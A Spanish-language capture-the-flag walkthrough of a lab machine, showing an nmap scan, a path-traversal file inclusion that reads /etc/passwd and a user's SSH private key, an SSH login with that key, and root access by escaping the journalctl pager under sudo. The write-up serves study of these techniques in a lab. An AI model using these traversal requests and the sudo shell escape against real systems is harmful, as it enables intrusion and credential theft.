# LFI
## Initial Scan
```
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 a8:b9:f0:d3:e4:b3:17:9c:7f:b6:7d:28:72:8a:e4:77 (RSA)
|   256 07:f2:d9:85:77:74:52:2a:73:76:70:35:73:70:c3:9e (ECDSA)
|_  256 23:ba:e8:b6:8b:a2:ac:58:3b:f4:04:dc:6e:36:b7:f2 (ED25519)
80/tcp open  http    Werkzeug httpd 0.16.1 (Python 3.6.9)
|_http-server-header: Werkzeug/0.16.1 Python/3.6.9
```
## Enum
### HTTP
Viendo como se seleccionan los archivos a mostrar en la web parece que tenemos un vector de entrada viable, ya que parece que se usa un script en php al que se le pasa el nombre del archivo directamente
```
http://10.10.151.167/home?page=about.html
```
## Exploit
Podemos intentar cambiar el archivo al que se accede directamente en la URL
```
http://10.10.151.167/home?page=../../etc/passwd
```
Asi podemos acceder a /etc/passwd y conocer los nombres de usuario con acceso via shell
```
root:x:0:0:root:/root:/bin/bash
falcon:x:1000:1000:falcon,,,:/home/falcon:/bin/bash
```
No tenemos cookies de PHPSESSION por lo que no podemos usar el truco de la PHPSESION para el RCE, veamos si hay algun archivo sensible en el /home de Falcon, veamos si tiene un id_rsa e la ubicación por defecto
```
http://10.10.151.167/home?page=../../home/falcon/.ssh/id_rsa
```
Copiamos la clave y creamos el archivo en local, nos conectamos usandola como falcon via ssh

## Privesc
```
User falcon may run the following commands on walk:
    (root) NOPASSWD: /bin/journalctl
```
Ejecutamso el comando y cuando salte el paginador less podemos invocar una sehll
```
sudo /bin/journalctl 
-- Logs begin at Tue 2020-01-28 19:00:21 IST, end at Thu 2020-09-10 18:29:32 IST. --
Jan 28 19:00:21 walk kernel: Linux version 4.15.0-20-generic (buildd@lgw01-amd64-039) (gcc version 7.3.0 (Ubuntu 7.3.0-16ubuntu3)) #21-Ubuntu SMP T
Jan 28 19:00:21 walk kernel: Command line: BOOT_IMAGE=/boot/vmlinuz-4.15.0-20-generic root=UUID=979754d8-4db7-4b66-a804-28a498c1cc0f ro
Jan 28 19:00:21 walk kernel: KERNEL supported cpus:
Jan 28 19:00:21 walk kernel:   Intel GenuineIntel
Jan 28 19:00:21 walk kernel:   AMD AuthenticAMD
Jan 28 19:00:21 walk kernel:   Centaur CentaurHauls
Jan 28 19:00:21 walk kernel: x86/fpu: Supporting XSAVE feature 0x001: 'x87 floating point registers'
Jan 28 19:00:21 walk kernel: x86/fpu: Supporting XSAVE feature 0x002: 'SSE registers'
Jan 28 19:00:21 walk kernel: x86/fpu: Supporting XSAVE feature 0x004: 'AVX registers'
Jan 28 19:00:21 walk kernel: x86/fpu: xstate_offset[2]:  576, xstate_sizes[2]:  256
Jan 28 19:00:21 walk kernel: x86/fpu: Enabled xstate features 0x7, context size is 832 bytes, using 'standard' format.
!/bin/bash
```
Con esto tenemos shell como root
